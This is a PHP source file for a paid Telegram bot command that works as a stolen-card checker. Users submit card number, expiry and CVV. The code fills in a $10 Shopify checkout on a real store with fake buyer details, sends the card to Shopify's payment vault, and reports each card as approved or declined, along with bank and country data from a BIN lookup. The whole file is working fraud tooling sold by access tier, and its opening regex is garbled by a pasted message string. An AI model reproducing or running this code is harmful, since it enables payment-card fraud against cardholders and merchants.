<?php



$ownerData = file_get_contents('database/owner.txt');
if (strpos($ownerData, "$userId") !== false) {
		$rank = "OWNER"; 
} else {
		$paidData = file_get_contents('database/paid.txt');
		$pattern = "/User ID: $userId\nR
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: Unregistered User! ⚠️
[↯]Message: You have to register first to use me
You have to use <code>/register</code> to use me 
- - - - - - - - - - - - - - - - - - - - - -ank: (.+)\n/";
		if (preg_match($pattern, $paidData, $matches)) {
				$rank = $matches[1];
		} else {
				$rank = "FREE";
		}
}



if((strpos($text, '/shp') === 0) or (strpos($text, '.shp') === 0) or ((strpos($text, '$shp') === 0) or (strpos($text, '!shp') === 0)) or ((strpos($text, '+shp') === 0) or (strpos($text, '#shp') === 0)) or (strpos($text, '?shp') === 0)) {


$userData = file_get_contents('database/users.txt');
if (strpos($userData, $userId) === false) {
bot('sendMessage', [
		'chat_id' => $chat_id,
		'message_id' => $message_id,
		'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Unregistered User! ⚠️</code>
[↯]Message: <code>You have to register first to use me</code>
You have to use <code>/register</code> to use me 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
		'reply_to_message_id' => $message_id,
		'parse_mode' => 'html'
]);
return;
}


if (strlen($message) <= 4) {
						bot('sendMessage', [
				'chat_id' => $chat_id,
				'message_id' => $message_id,
				'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - - 
[WRONG FORMAT] ⚠️
- - - - - - - - - - - - - - - - - - - - - -
Ex: <code>/chk cc|mm|yy|cvv</code>     
Gateway <code>Shopify 10$</code>        
- - - - - - - - - - - - - - - - - - - - - -
</b>",
				'reply_to_message_id' => $message_id,
				'parse_mode' => 'html'
		]);
return;
}  

$paid = file_get_contents('database/paid.txt');
if (preg_match('/User ID:\s*(\d+)/', $paid, $matches)) {
$paids = $matches[1];
}

$owner = file_get_contents('database/owner.txt');
$owners = explode("\n", $owner);

$authgrp = file_get_contents('database/authgrp.txt');
$authgrps = explode("\n", $authgrp);

if (strpos($paid, "User ID: $userId") === false) {
		bot('sendMessage', [
				'chat_id' => $chat_id,
				'message_id' => $message_id,
				'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>User is broke!</code>
[↯]Message: <code>Did you hear about the broke magician? He couldn't even pull a rabbit out of his empty wallet! Invest in my services and let's make your financial woes disappear!</code> 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
				'reply_to_message_id' => $message_id,
				'parse_mode' => 'html'
		]);
		return;
}


$spamResult = isSpamming($userId);
if ($spamResult !== false) {
bot('sendMessage', [
		'chat_id' => $chat_id,
		'message_id' => $message_id,
		'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ANTISPAM DETECTED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯] Try again after $spamResult seconds !
- - - - - - - - - - - - - - - - - - - - - -
</b>",
		'reply_to_message_id' => $message_id,
		'parse_mode' => 'html'
]);
return;
}  



//=========MAIN CODE===========//
$start_time = microtime(true);

$messageidtoedit50 = bot('sendmessage',[
					'chat_id'=>$chat_id,
					'text'=>"<b>Started checking...</b>",
					'parse_mode'=>'html',
					'reply_to_message_id'=> $message_id,

				]);

				$messageidtopfw = capture(json_encode($messageidtoedit50), '"message_id":', ',');

	if ($_SERVER['REQUEST_METHOD'] == "POST") {
		extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
		extract($_GET);
}


$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0, 1);
$exploded = multiexplode(array(":", "/", " ", "|", ""), $lista);
$cc = $exploded[0];
$mes = $exploded[1];
$ano = $exploded[2];
$cvv = $exploded[3];

if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
		bot('editMessageText', [
				'chat_id' => $chat_id,
				'message_id' => $messageidtopfw,
				'text' => "!𝙔𝙤𝙪 𝘿𝙪𝙢𝙗𝙤 𝘼𝙨𝙨 𝙃𝙤𝙡𝙚!\n𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>/chkcc|mm|yy|cvv</code>-",
				'parse_mode' => 'html',
				'reply_to_message_id' => $messageidtopfw,
				'disable_web_page_preview' => true
		]);
		return;
}

$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$lista = (''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');


$last4 = substr($cc, -4);

//=========BANNED BIN=============//
$bin = substr($cc, 0, 6);
$bannedBins = file("banned.txt", FILE_IGNORE_NEW_LINES);

if (in_array($bin, $bannedBins)) {
bot('editMessageText',[
						'chat_id'=>$chat_id,
						'message_id'=>$messageidtopfw,
						'text'=>"<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]BIN BANNED! ⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]CC: <code>$lista</code>
[↯]Reason: <code>All Prepaid banned!</code>
 - - - - - - - - - - - - - - - - - - - - - -
</b>",
						'parse_mode'=>'html',

				]);
return;
}

//---------------------//
bot('editMessageText',[
						'chat_id'=>$chat_id,
						'message_id'=>$messageidtopfw,
						'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Shopify 
Status: <code>■□□□□ 20%[🟥]</code>
Req: <code>@$username</code>
</b>",
						'parse_mode'=>'html',

				]);



function value($str,$find_start,$find_end)
{
		$start = @strpos($str,$find_start);
		if ($start === false) 
		{
				return "";
		}
		$length = strlen($find_start);
		$end    = strpos(substr($str,$start +$length),$find_end);
		return trim(substr($str,$start +$length,$end));
}

function getStr($string, $start, $end) {
		$str = explode($start, $string);
		$str = explode($end, $str[1]);  
		return $str[0];
}
function inStr($string, $start, $end, $value) {
		$str = explode($start, $string);
		$str = explode($end, $str[$value]);
		return $str[0];
}

function pro($stringlength = 16) {
		return substr(str_shuffle(str_repeat($string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($stringlength/strlen($string)) )),1,$stringlength);
}

#$key = pro();
$web = pro();  



	function mod($dividendo,$divisor)
{
		return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
		$characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$charactersLength = strlen($characters);
		$randomString     = '';
		for ($i = 0; $i < $length; $i++) {
				$randomString .= $characters[rand(0, $charactersLength - 1)];
		}
		return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
		$characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$charactersLength = strlen($characters);
		$randomString     = '';
		for ($i = 0; $i < $length; $i++) {
				$randomString .= $characters[rand(0, $charactersLength - 1)];
		}
		return $randomString;
}
$un = usernameGen();
$proxie = null;
$pass = null;
$cookieFile = getcwd() . '/cookies.txt';

function Capture2($str, $starting_word, $ending_word)
{
		$subtring_start  = strpos($str, $starting_word);
		$subtring_start += strlen($starting_word);
		$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;
		return substr($str, $subtring_start, $size);
}
$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://random-data-api.com/api/v2/users?size=2&is_xml=true');
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		$randomuser = curl_exec($ch);
		curl_close($ch);
		$firstnme = trim(strip_tags(getstr($randomuser, '"first_name":"', '"')));
		$lastnme = trim(strip_tags(getstr($randomuser, '"last_name":"', '"')));


		$site = 'allamericanroughneck.com';
#------[Password Generator]------#

//==================[Randomizing Details]======================//



//==============[Randomizing Details-END]======================//

bot('editMessageText',[
						'chat_id'=>$chat_id,
						'message_id'=>$messageidtopfw,
						'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Shopify 
Status: <code>□■□□□ 40%[🟦]</code>
Req: <code>@$username</code>
</b>",
						'parse_mode'=>'html',

				]);

//==================[BIN LOOK-UP]======================//

//==================[BIN LOOK-UP-END]======================//
function passwordGen($length = 15)
{
		$characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$charactersLength = strlen($characters);
		$randomString     = '';
		for ($i = 0; $i < $length; $i++) {
				$randomString .= $characters[rand(0, $charactersLength - 1)];
		}
		return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
		"3" => "American Express",
		"4" => "Visa",
		"5" => "MasterCard",
		"6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];


 $fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$bin), true);
 $bin1 = $fim["bin"] ?? null;

		 if ($bin1 !== null) {
				 $brand = $fim["brand"];
				 $country = $fim["country"];
				 $country_name = $fim["country_name"];
				 $country_flag = $fim["country_flag"];

				 $country_currencies = $fim["country_currencies"];
				 $bank = $fim["bank"];
				 $level = $fim["level"];
				 $type = $fim["type"];
		 }



//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://allamericanroughneck.com/cart/41032415431:1?traffic_source=buy_now');
curl_setopt($ch, CURLOPT_HEADER, 1);
$headers = array();
$headers[] = 'Host: ' . $site . '';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
$r1 = curl_exec($ch);
$shit = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
curl_close($ch);

$token = trim(strip_tags(getstr($r1, 'name="authenticity_token" value="', '"')));

$zo = Capture2($r1, '"pageurl":"', '?traffic_source=buy_now"');
$partes = explode('\/', $zo);

$id1 = $partes[1];
$checkouts = $partes[3];



bot('editMessageText',[
						'chat_id'=>$chat_id,
						'message_id'=>$messageidtopfw,
						'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Shopify 10$
Status: <code>□□■□□ 60%[🟨]</code>
Req: <code>@$username</code>
</b>",
						'parse_mode'=>'html',

				]);
//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/' . $id1 . '/checkouts/' . $checkouts . '');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: ' . $site . '';
$headers[] = 'method: POST';
$headers[] = 'path: /' . $id1 . '/checkouts/' . $checkouts . '';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: es-PE,es-419;q=0.9,es;q=0.8,en;q=0.7,pt;q=0.6';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://' . $site . '';
$headers[] = 'referer: https://' . $site . '/';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token=' . $token . '&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D=josewers20%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bbilling_address%5D%5Bfirst_name%5D=jhin&checkout%5Bbilling_address%5D%5Blast_name%5D=vega&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=street+212&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=new+york&checkout%5Bbilling_address%5D%5Bcountry%5D=US&checkout%5Bbilling_address%5D%5Bprovince%5D=New+York&checkout%5Bbilling_address%5D%5Bzip%5D=10080&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bbilling_address%5D%5Bfirst_name%5D=jhin&checkout%5Bbilling_address%5D%5Blast_name%5D=vega&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=street+212&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=new+york&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bprovince%5D=New+York&checkout%5Bbilling_address%5D%5Bzip%5D=10080&checkout%5Bbilling_address%5D%5Bphone%5D=9703878998&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&button=');
$r2 = curl_exec($ch);
curl_close($ch);


$token2 = trim(strip_tags(getstr($r2, 'name="authenticity_token" value="', '"')));

echo "<hr>$token";


bot('editMessageText',[
						'chat_id'=>$chat_id,
						'message_id'=>$messageidtopfw,
						'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Shopify 10$
Status: <code>□□□■□ 80%[🟧]</code>
Req: <code>@$username</code>
</b>",
						'parse_mode'=>'html',

				]);

//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: es-PE,es-419;q=0.9,es;q=0.8,en;q=0.7,pt;q=0.6';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: deposit.us.shopifycs.com';
$headers[] = 'Origin: https://checkout.shopifycs.com';
$headers[] = 'Referer: https://checkout.shopifycs.com/';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"' . $cc . '","name":"' . $lastnme . ' ' . $firstnme . '","month":' . $mes . ',"year":' . $ano . ',"verification_value":"' . $cvv . '"},"payment_session_scope":"' . $site . '"}');
$r4 = curl_exec($ch);
curl_close($ch);
$sid = trim(strip_tags(getstr($r4, '{"id":"', '"}')));

echo "sid: $sid";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/' . $id1 . '/checkouts/' . $checkouts . '');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: ' . $site . '';
$headers[] = 'method: POST';
$headers[] = 'path: /' . $id1 . '/checkouts/' . $checkouts . '';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: es-PE,es;q=0.9';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://' . $site . '';
$headers[] = 'referer: https://' . $site . '/';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token=' . $token2 . '&previous_step=payment_method&step=&s=' . $sid . '&checkout%5Bpayment_gateway%5D=78701920407&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Btotal_price%5D=1000&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=759&checkout%5Bclient_details%5D%5Bbrowser_height%5D=635&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$r5 = curl_exec($ch);
sleep(5);
curl_close($ch);

#---- 6 REQ

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/' . $id1 . '/checkouts/' . $checkouts . '?from_processing_page=1&validate=true');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
		'authority: www.windsorstore.com',
		'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language: es-ES,es;q=0.9',
		'referer: https://www.windsorstore.com/',
		'sec-fetch-dest: document',
		'sec-fetch-mode: navigate',
		'sec-fetch-site: same-origin',
		'upgrade-insecure-requests: 1',
		'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);

$r6 = curl_exec($ch);
curl_close($ch);
//=======================[MADE BY SIFAT]==============================//
$msg = trim(strip_tags(getstr($r6, 'class="notice__content"><p class="notice__text">', '</p></div></div>')));
bot('editMessageText',[
						'chat_id'=>$chat_id,
						'message_id'=>$messageidtopfw,
						'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Shopify 10$
Status: <code>□□□□■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>",
						'parse_mode'=>'html',

				]);

//=============CHECKER PART END============//


if (strpos($r6, 'Security code was not matched by the processor') || strpos($r6, 'Security codes does not match correct format (3-4 digits)')) {
		$es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";

		} elseif (strpos($r6, 'Your order is confirmed') || strpos($r6, 'Thanks for supporting') || strpos($r6, '<div class="webform-confirmation">')) {
		$es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
			} elseif (strpos($r6, "Card was declined")) {
			$es = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌";
			$msg = "$msg";
						} elseif (strpos($r6, "The merchant does not accept this type of credit card")) {
			$es = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌";
			$msg = "$msg";
			} else {
			$es = "$eror";
					$msg = "$msg";
			}

$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
//=============CHECKER END=============//


bot('editMessageText',[
								'chat_id'=>$chat_id,
								'message_id'=>$messageidtopfw,
'text'=>"<b>
Shopify 10$ 🌩
━━━━━━━━━━━━━
[ϟ]Card: <code>$lista</code> 
[ϟ]Status: $es
[ϟ]Result: $msg

[ϟ]Brand: <code>$level-$brand</code>
[ϟ]Type: <code>$type</code>
[ϟ]Bank: <code>$bank</code>
[ϟ]Country: <code>$country_name [$country_flag]</code>

[ϟ]T: <code>$time SEC</code> | P: <code>Live ✅</code>
━━━━━━━━━━━━━
[ϟ]Req: <b>@$username</b> [$rank]
[ϟ]Dev: <code>@celestial_being</code>

</b>",
			'parse_mode'=>'html',
								'disable_web_page_preview'=>'true'

						]);
	recordBotResponseTimestamp($userId);



}
